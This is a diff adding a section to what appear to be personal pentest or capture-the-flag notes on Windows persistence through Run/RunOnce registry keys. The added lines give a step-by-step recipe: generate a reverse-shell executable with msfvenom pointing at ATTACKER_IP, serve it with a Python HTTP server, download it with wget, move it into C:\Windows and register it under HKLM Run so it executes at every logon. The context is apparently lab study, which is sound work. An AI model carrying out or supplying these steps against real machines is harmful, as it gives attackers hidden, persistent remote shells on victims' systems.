@@ -198,4 +198,20 @@ nc -lvp 4450
 -log back in 
 -grab flag
 
-
+Run / RunOnce
+-force a nuser to execute a program on logon via registry
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+-HKLM: everyone, HKCU: current user
+-create payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+-start httpserver
+python3 -m http.server
+-get payload
+wget http://AttackIP:8000/revshell.exe -O revshell.exe
+-move payload
+move revshell.exe C:\Windows
+go to HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+-add REG_EXPAND_SZ with value C:\Windows\revshell.exe
